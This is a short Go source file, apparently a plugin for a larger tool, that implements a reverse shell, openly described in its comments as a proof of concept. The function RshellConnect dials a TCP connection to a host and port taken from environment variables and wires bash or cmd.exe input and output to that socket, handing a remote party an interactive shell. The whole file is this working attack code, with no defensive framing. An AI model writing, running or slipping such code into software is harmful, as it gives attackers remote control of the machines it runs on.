package rshell

// Early implementation of a reverse shell plugin.
// This plugin is not complete and is only a proof of concept.
// The plugin connects to a remote server and executes a shell.

import (
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
)

var rshell_ip = os.Getenv("RSHELL_IP")
var rshell_port = os.Getenv("RSHELL_PORT")

// var rhell_cert = config.RshellCert
// var rshell_key = config.RshellKey

func RshellConnect() {
	if rshell_ip == "" || rshell_port == "" {
		log.Printf("[RShell] RShell IP or port not set")
		return
	}
	c, _ := net.Dial("tcp", rshell_ip+":"+rshell_port)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd")
	} else {
		cmd = exec.Command("bash")
	}
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
